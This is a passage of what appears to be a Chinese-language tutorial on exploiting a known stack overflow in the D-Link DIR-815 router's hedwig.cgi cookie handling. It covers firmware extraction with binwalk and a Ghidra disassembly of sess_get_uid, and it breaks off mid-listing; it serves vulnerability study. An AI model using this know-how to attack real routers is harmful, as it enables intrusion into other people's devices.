class="hljs-punctuation">,</span>如果有就根据汇编文件自己修改一下<span class="hljs-punctuation">,</span>没有就直接用(想多<br>根据反汇编代码来自己写一下汇编代码<span class="hljs-punctuation">,</span>然后根据需求修改到字节数大小满足<span class="hljs-punctuation">,</span>没有截断就结束:)<br>然后objcopy一步到位<br></code></pre></td></tr></table></figure><h2 id="实例分析-D-LINK-DIR-815多次溢出"><a href="#实例分析-D-LINK-DIR-815多次溢出" class="headerlink" title="实例分析(D-LINK DIR-815多次溢出)"></a>实例分析(D-LINK DIR-815多次溢出)</h2><h3 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h3><p>D-Link Devices - ‘hedwig.cgi’ Remote Buffer Overflow in Cookie Header</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.exploit-db.com<span class="hljs-regexp">/exploits/</span><span class="hljs-number">33863</span><br></code></pre></td></tr></table></figure><p>虽然D-link官网只说明645版本会收到影响,但其实815,300,615也会有</p><h3 id="固件下载地址"><a href="#固件下载地址" class="headerlink" title="固件下载地址:"></a>固件下载地址:</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ftp</span>://ftp2.dlink.com/PRODUCTS/DIR-<span class="hljs-number">815</span>/REVA/DIR-<span class="hljs-number">815</span>_FIRMWARE_1.<span class="hljs-number">01</span>.ZIP<br></code></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们根据公布漏洞的题目可以看出bug是出在’hedwig.cgi’文件内,而漏洞的成因是因为cookie过长可以导致栈溢出</p><p>下载完成后进行固件的提取,这里我们直接用binwalk就可以直接提取</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">binwalk</span> -e DIR-<span class="hljs-number">815</span>.bin<br></code></pre></td></tr></table></figure><p>然后进入 squashfs-root文件夹下就可以看到熟悉的内容了</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tcl"> ~/iot/real/D-LINK815栈溢出/dir815_FW_101/_DIR<span class="hljs-number">-815.</span>bin.extracted/squashfs-root  ls<br>bin  dev  etc  home  htdocs  lib  mnt  <span class="hljs-keyword">proc</span><span class="hljs-title">  sbin</span> <span class="hljs-title"> sys</span> <span class="hljs-title"> tmp</span> <span class="hljs-title"> usr</span> <span class="hljs-title"> var</span> <span class="hljs-title"> www</span><br></code></pre></td></tr></table></figure><p>这时我们直接使用find命令搜索hedwig.cgi的位置即可</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> ./ -name <span class="hljs-string">&#x27;hedwig.cgi&#x27;</span><br>.<span class="hljs-regexp">/htdocs/</span>web/hedwig.cgi<br></code></pre></td></tr></table></figure><p>这时我们看看该文件是什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/iot/real/D-LINK815栈溢出/dir815_FW_101/_DIR-815.bin.extracted/squashfs-root/htdocs/web  <span class="hljs-built_in">ls</span> -l hedwig.cgi <br>lrwxrwxrwx 1 nightrainy nightrainy 14 Nov  8 17:52 hedwig.cgi -&gt; /htdocs/cgibin<br><br></code></pre></td></tr></table></figure><p>可以看到这个文件是指向cgibin的符号链接,下面我们就对该文件进行反汇编分析,由于是cookie导致的溢出,那么我们就直接对cookie进行分析,我们可以通过查询字符串来定位函数位置,这里我使用的是ghidra,当然,IDA也是一样的效果<br>可以搜索到字符串的函数应该是sess_get_uid函数,反汇编代码如下:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br>                     **************************************************************<br>                     *                          FUNCTION                          *<br>                     **************************************************************<br>                     undefined sess_get_uid()<br>                       assume <span class="hljs-built_in">gp</span> = <span class="hljs-number">0x4346d0</span><br>                       assume <span class="hljs-built_in">t9</span> = <span class="hljs-number">0x407c98</span><br>     undefined         <span class="hljs-built_in">v0</span>:<span class="hljs-number">1</span>           &lt;RETURN&gt;<br><br>                     sess_get_uid                                    XREF[<span class="hljs-number">9</span>]:     Entry Point(*), <br><span class="hljs-symbol">                                                                                  phpcgi_main:</span><span class="hljs-number">00405498</span>(c), <br><span class="hljs-symbol">                                                                                  authentication:</span><span class="hljs-number">0040825</span>c(c), <br><span class="hljs-symbol">                                                                                  sess_generate_captcha:</span><span class="hljs-number">0040861</span>c(c<br><span class="hljs-symbol">                                                                                  sess_validate:</span><span class="hljs-number">004087</span>b0(c), <br><span class="hljs-symbol">                                                                                  sess_logout:</span><span class="hljs-number">0040893</span>c(c), <br><span class="hljs-symbol">                                                                                  hedwigcgi_main:</span><span class="hljs-number">00409648</span>(c), <br><span class="hljs-symbol">                                                                                  pigwidgeoncgi_main:</span><span class="hljs-number">00409</span>c44(c), <br>                                                                                  <span class="hljs-number">0042</span>c714(*)  <br><span class="hljs-number">00407</span>c98 <span class="hljs-number">43</span> <span class="hljs-number">00</span> <span class="hljs-number">1</span>c <span class="hljs-number">3</span>c     <span class="hljs-keyword">lui </span>       <span class="hljs-built_in">gp</span>,<span class="hljs-number">0x43</span><br>     assume <span class="hljs-built_in">t9</span> = &lt;UNKNOWN&gt;<br>     assume <span class="hljs-built_in">gp</span> = &lt;UNKNOWN&gt;<br><span class="hljs-number">00407</span>c9c c0 ff <span class="hljs-keyword">bd </span><span class="hljs-number">27</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">sp</span>,-<span class="hljs-number">0x40</span><br><span class="hljs-number">00407</span>ca0 d0 <span class="hljs-number">46</span> <span class="hljs-number">9</span>c <span class="hljs-number">27</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">gp</span>,<span class="hljs-built_in">gp</span>,<span class="hljs-number">0x46d0</span><br><span class="hljs-number">00407</span>ca4 <span class="hljs-number">3</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">bf </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">ra</span>,local_4(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>ca8 <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-keyword">be </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s8</span>,local_8(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>cac <span class="hljs-number">34</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b7 </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s7</span>,local_c(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>cb0 <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b6 </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s6</span>,local_10(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>cb4 <span class="hljs-number">2</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">b5 </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s5</span>,local_14(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>cb8 <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b4 </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s4</span>,local_18(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>cbc <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b3 </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s3</span>,local_1c(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>cc0 <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b2 </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s2</span>,local_20(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>cc4 <span class="hljs-number">1</span>c <span class="hljs-number">00</span> <span class="hljs-keyword">b1 </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s1</span>,local_24(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>cc8 <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-keyword">b0 </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">s0</span>,local_28(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>ccc <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span>af     <span class="hljs-keyword">sw </span>        <span class="hljs-built_in">gp</span>=&gt;_<span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>cd0 f4 <span class="hljs-number">80</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7f0c</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_new                       = <span class="hljs-number">0040</span>f560<br><span class="hljs-number">00407</span>cd4 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>cd8 <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;sobj_new                                     undefined sobj_new()<br><span class="hljs-number">00407</span>cdc <span class="hljs-number">21</span> <span class="hljs-keyword">b0 </span><span class="hljs-number">80</span> <span class="hljs-number">00</span>     _move      <span class="hljs-built_in">s6</span>,<span class="hljs-built_in">a0</span><br><span class="hljs-number">00407</span>ce0 <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>ce4 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>ce8 f4 <span class="hljs-number">80</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7f0c</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_new                       = <span class="hljs-number">0040</span>f560<br><span class="hljs-number">00407</span>cec <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>cf0 <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;sobj_new                                     undefined sobj_new()<br><span class="hljs-number">00407</span>cf4 <span class="hljs-number">21</span> <span class="hljs-number">90</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>     _move      <span class="hljs-built_in">s2</span>,<span class="hljs-built_in">v0</span><br><span class="hljs-number">00407</span>cf8 <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>cfc <span class="hljs-number">42</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">3</span>c     <span class="hljs-keyword">lui </span>       <span class="hljs-built_in">a0</span>,<span class="hljs-number">0x42</span><br><span class="hljs-number">00407</span>d00 dc <span class="hljs-number">82</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7d24</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;getenv                         = <span class="hljs-number">004194</span>b0<br><span class="hljs-number">00407</span>d04 cc <span class="hljs-built_in">a5</span> <span class="hljs-number">84</span> <span class="hljs-number">24</span>     <span class="hljs-keyword">addiu </span>     <span class="hljs-built_in">a0</span>=&gt;s_HTTP_COOKIE_0041a5cc,<span class="hljs-built_in">a0</span>,-<span class="hljs-number">0x5a34</span>            = <span class="hljs-string">&quot;HTTP_COOKIE&quot;</span><br><span class="hljs-number">00407</span>d08 <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;getenv                                       char * getenv(char * __name)<br><span class="hljs-number">00407</span>d0c <span class="hljs-number">21</span> <span class="hljs-number">98</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>     _move      <span class="hljs-built_in">s3</span>,<span class="hljs-built_in">v0</span><br><span class="hljs-number">00407</span>d10 <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>d14 <span class="hljs-number">72</span> <span class="hljs-number">00</span> <span class="hljs-number">40</span> <span class="hljs-number">12</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">s2</span>,<span class="hljs-built_in">zero</span>,LAB_00407ee0<br><span class="hljs-number">00407</span>d18 <span class="hljs-number">42</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">3</span>c     _lui       <span class="hljs-built_in">a0</span>,<span class="hljs-number">0x42</span><br><span class="hljs-number">00407</span>d1c <span class="hljs-number">70</span> <span class="hljs-number">00</span> <span class="hljs-number">60</span> <span class="hljs-number">12</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">s3</span>,<span class="hljs-built_in">zero</span>,LAB_00407ee0<br><span class="hljs-number">00407</span>d20 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _nop<br><span class="hljs-number">00407</span>d24 <span class="hljs-number">6</span>e <span class="hljs-number">00</span> <span class="hljs-number">40</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">v0</span>,<span class="hljs-built_in">zero</span>,LAB_00407ee0<br><span class="hljs-number">00407</span>d28 <span class="hljs-number">21</span> <span class="hljs-built_in">a0</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>     _move      <span class="hljs-built_in">s4</span>,<span class="hljs-built_in">v0</span><br><span class="hljs-number">00407</span>d2c <span class="hljs-number">21</span> <span class="hljs-number">88</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     clear      <span class="hljs-built_in">s1</span><br><span class="hljs-number">00407</span>d30 <span class="hljs-number">3</span>b <span class="hljs-number">00</span> <span class="hljs-number">15</span> <span class="hljs-number">24</span>     li         <span class="hljs-built_in">s5</span>,<span class="hljs-number">0x3b</span><br><span class="hljs-number">00407</span>d34 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">1</span>e <span class="hljs-number">24</span>     li         <span class="hljs-built_in">s8</span>,<span class="hljs-number">0x3</span><br><span class="hljs-number">00407</span>d38 <span class="hljs-number">3</span>b <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">b </span>         LAB_00407e28<br><span class="hljs-number">00407</span>d3c <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">17</span> <span class="hljs-number">24</span>     _li        <span class="hljs-built_in">s7</span>,<span class="hljs-number">0x20</span><br>                     LAB_00407d40                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>e30(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>d40 <span class="hljs-number">1</span>b <span class="hljs-number">00</span> <span class="hljs-number">22</span> <span class="hljs-number">12</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">s1</span>,<span class="hljs-built_in">v0</span>,LAB_00407db0<br><span class="hljs-number">00407</span>d44 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">22</span> <span class="hljs-number">2</span>a     _slti      <span class="hljs-built_in">v0</span>,<span class="hljs-built_in">s1</span>,<span class="hljs-number">0x2</span><br><span class="hljs-number">00407</span>d48 <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">40</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">v0</span>,<span class="hljs-built_in">zero</span>,LAB_00407d60<br><span class="hljs-number">00407</span>d4c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _nop<br><span class="hljs-number">00407</span>d50 <span class="hljs-number">0</span>a <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">12</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">s1</span>,<span class="hljs-built_in">zero</span>,LAB_00407d7c<br><span class="hljs-number">00407</span>d54 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _nop<br><span class="hljs-number">00407</span>d58 <span class="hljs-number">33</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">b </span>         LAB_00407e28<br><span class="hljs-number">00407</span>d5c <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">94</span> <span class="hljs-number">26</span>     _addiu     <span class="hljs-built_in">s4</span>,<span class="hljs-built_in">s4</span>,<span class="hljs-number">0x1</span><br>                     LAB_00407d60                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>d48(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>d60 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">24</span>     li         <span class="hljs-built_in">v0</span>,<span class="hljs-number">0x2</span><br><span class="hljs-number">00407</span>d64 <span class="hljs-number">1</span>d <span class="hljs-number">00</span> <span class="hljs-number">22</span> <span class="hljs-number">12</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">s1</span>,<span class="hljs-built_in">v0</span>,LAB_00407ddc<br><span class="hljs-number">00407</span>d68 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _nop<br><span class="hljs-number">00407</span>d6c <span class="hljs-number">2</span>d <span class="hljs-number">00</span> <span class="hljs-number">3</span>e <span class="hljs-number">16</span>     <span class="hljs-keyword">bne </span>       <span class="hljs-built_in">s1</span>,<span class="hljs-built_in">s8</span>,LAB_00407e24<br><span class="hljs-number">00407</span>d70 <span class="hljs-number">42</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">3</span>c     _lui       <span class="hljs-built_in">a1</span>,<span class="hljs-number">0x42</span><br><span class="hljs-number">00407</span>d74 <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span>     <span class="hljs-keyword">b </span>         LAB_00407e08<br><span class="hljs-number">00407</span>d78 <span class="hljs-number">21</span> <span class="hljs-number">20</span> <span class="hljs-number">40</span> <span class="hljs-number">02</span>     _move      <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">s2</span><br>                     LAB_00407d7c                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>d50(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>d7c <span class="hljs-number">29</span> <span class="hljs-number">00</span> <span class="hljs-number">17</span> <span class="hljs-number">12</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">s0</span>,<span class="hljs-built_in">s7</span>,LAB_00407e24<br><span class="hljs-number">00407</span>d80 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     _nop<br><span class="hljs-number">00407</span>d84 <span class="hljs-number">74</span> <span class="hljs-number">81</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7e8c</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_free                      = <span class="hljs-number">0040</span>e<span class="hljs-symbol">6b</span>8<br><span class="hljs-number">00407</span>d88 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>d8c <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;sobj_free                                    undefined sobj_free()<br><span class="hljs-number">00407</span>d90 <span class="hljs-number">21</span> <span class="hljs-number">20</span> <span class="hljs-number">40</span> <span class="hljs-number">02</span>     _move      <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">s2</span><br><span class="hljs-number">00407</span>d94 <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br><span class="hljs-number">00407</span>d98 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>d9c <span class="hljs-number">74</span> <span class="hljs-number">81</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7e8c</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_free                      = <span class="hljs-number">0040</span>e<span class="hljs-symbol">6b</span>8<br><span class="hljs-number">00407</span>da0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-number">00407</span>da4 <span class="hljs-number">09</span> f8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>     <span class="hljs-keyword">jalr </span>      <span class="hljs-built_in">t9</span>=&gt;sobj_free                                    undefined sobj_free()<br><span class="hljs-number">00407</span>da8 <span class="hljs-number">21</span> <span class="hljs-number">20</span> <span class="hljs-number">60</span> <span class="hljs-number">02</span>     _move      <span class="hljs-built_in">a0</span>,<span class="hljs-built_in">s3</span><br><span class="hljs-number">00407</span>dac <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-keyword">bc </span><span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">gp</span>,local_30(<span class="hljs-built_in">sp</span>)<br>                     LAB_00407db0                                    XREF[<span class="hljs-number">1</span>]:     <span class="hljs-number">00407</span>d40(<span class="hljs-keyword">j) </span> <br><span class="hljs-number">00407</span>db0 <span class="hljs-number">4</span>e <span class="hljs-number">00</span> <span class="hljs-number">15</span> <span class="hljs-number">12</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">s0</span>,<span class="hljs-built_in">s5</span>,LAB_00407eec<br><span class="hljs-number">00407</span>db4 <span class="hljs-number">3</span>d <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">24</span>     _li        <span class="hljs-built_in">v0</span>,<span class="hljs-number">0x3d</span><br><span class="hljs-number">00407</span>db8 <span class="hljs-number">1</span>a <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">12</span>     <span class="hljs-keyword">beq </span>       <span class="hljs-built_in">s0</span>,<span class="hljs-built_in">v0</span>,LAB_00407e24<br><span class="hljs-number">00407</span>dbc <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">11</span> <span class="hljs-number">24</span>     _li        <span class="hljs-built_in">s1</span>,<span class="hljs-number">0x2</span><br><span class="hljs-number">00407</span>dc0 <span class="hljs-number">6</span>c <span class="hljs-number">82</span> <span class="hljs-number">99</span> <span class="hljs-number">8</span>f     <span class="hljs-keyword">lw </span>        <span class="hljs-built_in">t9</span>,-<span class="hljs-number">0x7d94</span>(<span class="hljs-built_in">gp</span>)=&gt;-&gt;sobj_add_char                  = <span class="hljs-number">0040</span>eb08<br><span class="hljs-number">00407</span>dc4 <span class="hljs-number">21</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span>     <span class="hljs-keyword">move </span>      <span class="hljs-built_in">a1</span>,<span 